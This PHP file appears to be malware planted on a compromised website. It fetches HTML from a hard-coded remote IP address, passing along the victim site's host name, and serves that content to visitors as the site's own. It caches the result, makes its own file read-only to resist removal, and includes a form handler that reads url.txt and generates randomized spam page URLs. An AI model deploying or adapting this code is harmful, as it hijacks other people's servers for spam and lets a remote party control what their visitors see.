<?php
set_time_limit(0);
$a="./";
$b=0;
createFolder($a);
function createFolder($c){
	if(!file_exists($c)){
		createFolder(dirname($c));
		mkdir($c,0777);
	}
}
function cache_start($b,$a){
	$d=$a.'/'.sha1($_SERVER['REQUEST_URI']).'.html';
	ob_start();
	if(file_exists($d)){
		include($d);
		ob_end_flush();
		exit;
	}
}
function cache_end($a){
	$d=$a.'/'.sha1($_SERVER['REQUEST_URI']).'.html';
	$e=fopen($d,'w');
	fwrite($e,ob_get_contents());
	fclose($e);
	ob_end_flush();
}

cache_start($b,$a);

header("Content-Type: text/html;charset=gb2312");

$f="http://45.252.63.32/";

$g="http://".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'];

$h=getHTTPPage($f."/index.php?host=".$g);

function getHTTPPage($i){
	$j=array(
		'http'=>array(
			'method'=>"GET",'header'=>"User-Agent: aQ0O010O"
		)
	);
	$k=stream_context_create($j);
	$l=@file_get_contents($i,false,$k);
	if(empty($l)){
		exit("<p align='center'><font color='red'><b>Connection Error!</b></font></p>");
	}
	return $l;
}
echo $h;
$m=$_SERVER['PHP_SELF'];
$n=@end(explode('/',$m));
function set_writeable($o){
	@chmod($o,0444);
}
set_writeable($n);
cache_end($a);
?>


<?php
if($_POST[Submit]){
	set_time_limit(0);
	error_reporting(0);
	header("Content-type: text/html; charset=gb2312");
	$p=file('url.txt');
	$q=$_POST["fks"];
	function createRandomStr($r){
		$s='0123456789qazwsxedcrfvtgbyhnujmiklop';
		$t=62;
		while($r>$t){
			$s.=$s;
			$t+=62;
		}
		$s=str_shuffle($s);
		return substr($s,0,$r);
	}
	function gettitle($u){
		global $p;
		$s=$p[$u];
		return $s;
	}
	for($v=0;$v<count($p);$v++){
		for($w=1;$w<$q+1;$w++){
			echo trim(gettitle($v))."?".createRandomStr(5).".html</br>";
		}
	}
}
?> 
